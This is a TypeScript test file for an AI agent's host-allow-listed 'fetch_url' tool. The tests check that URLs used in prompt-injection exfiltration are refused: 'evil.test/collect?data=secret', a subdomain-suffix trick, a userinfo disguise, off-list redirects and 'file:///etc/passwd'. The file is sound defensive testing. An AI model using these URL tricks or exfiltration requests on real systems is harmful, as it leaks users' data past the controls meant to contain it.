import { describe, it, expect } from 'vitest'
import type { ToolContext } from '@chorus/core'
import { createFetchUrlTool } from './fetch-url.js'

/**
 * AGENT-5 AC6 — `fetch_url` is host-allow-listed.
 *
 * The issue calls this "a defence against prompt injection driving
 * exfiltration", and that framing is the whole design. The threat is not a
 * user asking for a bad URL; it is retrieved content containing an instruction,
 * and a model following it — so the check cannot be advisory, cannot be
 * something the model influences, and must survive every trick that makes one
 * URL look like another.
 *
 * Most of these tests are that last part. An allow-list compared naively is
 * defeated by a redirect, by a userinfo segment, by a subdomain suffix, or by
 * an IP address that resolves inside the network.
 */

const context = (fetchImpl: typeof fetch): ToolContext => ({
  workspaceId: '01ARZ3NDEKTSV4RRFFQ69G5FAV',
  teamId: '01ARZ3NDEKTSV4RRFFQ69G5FB0',
  runId: '01ARZ3NDEKTSV4RRFFQ69G5FB1',
  actor: { userId: 'user-1', role: 'member' },
  now: () => new Date('2026-09-03T12:00:00.000Z'),
  fetch: fetchImpl,
})

const ok = (async () =>
  new Response('hello', { status: 200, headers: { 'content-type': 'text/plain' } })) as typeof fetch

const never = (async () => {
  throw new Error('the network must not be reached')
}) as typeof fetch

describe('AGENT-5 AC6 fetch_url', () => {
  const tool = createFetchUrlTool({ allowedHosts: ['docs.example.com', 'api.example.com'] })

  it('AGENT-5 AC6: an allow-listed host is fetched', async () => {
    const result = await tool.execute({ url: 'https://docs.example.com/guide' }, context(ok))
    expect(result.status).toBe(200)
    expect(result.body).toContain('hello')
  })

  it('AGENT-5 AC6: a host outside the allow-list is refused, without a request', async () => {
    // `never` throws if reached. A refusal that happens after the request has
    // gone out has already exfiltrated whatever was in the URL.
    await expect(
      tool.execute({ url: 'https://evil.test/collect?data=secret' }, context(never)),
    ).rejects.toThrow(/not allow-listed/i)
  })

  it('AGENT-5 AC6: a subdomain of an allowed host is not itself allowed', async () => {
    // `docs.example.com.evil.test` ends with the allowed host as a *string*.
    // A suffix comparison is the classic way this check is defeated.
    await expect(
      tool.execute({ url: 'https://docs.example.com.evil.test/x' }, context(never)),
    ).rejects.toThrow(/not allow-listed/i)
  })

  it('AGENT-5 AC6: userinfo cannot disguise the host', async () => {
    // `https://docs.example.com@evil.test/` has host `evil.test`; the part that
    // looks like the allowed host is a username. Anything comparing on the raw
    // string rather than the parsed host is fooled.
    await expect(
      tool.execute({ url: 'https://docs.example.com@evil.test/x' }, context(never)),
    ).rejects.toThrow(/not allow-listed/i)
  })

  it('AGENT-5 AC6: only http and https are fetchable', async () => {
    // `file:` reads the container's disk and `gopher:`/`ftp:` reach places a
    // fetch policy does not describe.
    for (const url of ['file:///etc/passwd', 'ftp://docs.example.com/x', 'data:text/plain,hi']) {
      await expect(tool.execute({ url }, context(never)), url).rejects.toThrow()
    }
  })

  it('AGENT-5 AC6: a redirect to a host outside the list is not followed', async () => {
    // The subtlest one. An allow-listed host that redirects elsewhere would
    // otherwise carry the request straight past the check, and a redirect is
    // something the *remote* controls.
    const redirecting = (async () =>
      new Response(null, { status: 302, headers: { location: 'https://evil.test/collect' } })) as typeof fetch

    // Refused by the allow-list, naming the host it was redirected *to* —
    // which is the useful message, because "a redirect was refused" does not
    // tell an operator where it was trying to go.
    await expect(
      tool.execute({ url: 'https://docs.example.com/start' }, context(redirecting)),
    ).rejects.toThrow(/evil\.test.*not allow-listed/i)
  })

  it('AGENT-5 AC6: a redirect within the allow-list is followed', async () => {
    let call = 0
    const redirecting = (async () => {
      call += 1
      return call === 1
        ? new Response(null, { status: 301, headers: { location: 'https://api.example.com/v2' } })
        : new Response('moved here', { status: 200 })
    }) as typeof fetch

    const result = await tool.execute({ url: 'https://docs.example.com/old' }, context(redirecting))
    expect(result.body).toContain('moved here')
    expect(result.finalUrl).toBe('https://api.example.com/v2')
  })

  it('AGENT-5 AC6: redirects are bounded, so a loop cannot hang a run', async () => {
    const looping = (async () =>
      new Response(null, {
        status: 302,
        headers: { location: 'https://docs.example.com/loop' },
      })) as typeof fetch

    await expect(
      tool.execute({ url: 'https://docs.example.com/loop' }, context(looping)),
    ).rejects.toThrow(/redirect/i)
  })

  it('AGENT-5 AC6: an empty allow-list refuses everything rather than allowing everything', async () => {
    // The direction a default must fail in. A deployment that configured no
    // hosts has not opted into unrestricted web access.
    const closed = createFetchUrlTool({ allowedHosts: [] })
    await expect(
      closed.execute({ url: 'https://docs.example.com/x' }, context(never)),
    ).rejects.toThrow(/not allow-listed/i)
  })

  it('AGENT-5 AC6: the response is truncated, so one page cannot fill a context window', async () => {
    const enormous = (async () => new Response('x'.repeat(500_000), { status: 200 })) as typeof fetch
    const result = await tool.execute({ url: 'https://docs.example.com/big' }, context(enormous))

    expect(result.body.length).toBeLessThan(200_000)
    expect(result.truncated).toBe(true)
  })

  it('AGENT-5: the tool reads and therefore needs no external-write checkpoint', () => {
    // Gating a read would train people to approve without reading, and the
    // allow-list is the control that matters here.
    expect(tool.sideEffect).toBe('none')
    expect(tool.requiredRole).toBe('member')
  })

  it('AGENT-5 AC6: a tool with no injected fetch cannot reach the network at all', async () => {
    const withoutFetch = { ...context(never) }
    delete (withoutFetch as { fetch?: unknown }).fetch

    await expect(
      tool.execute({ url: 'https://docs.example.com/x' }, withoutFetch),
    ).rejects.toThrow(/network/i)
  })
})
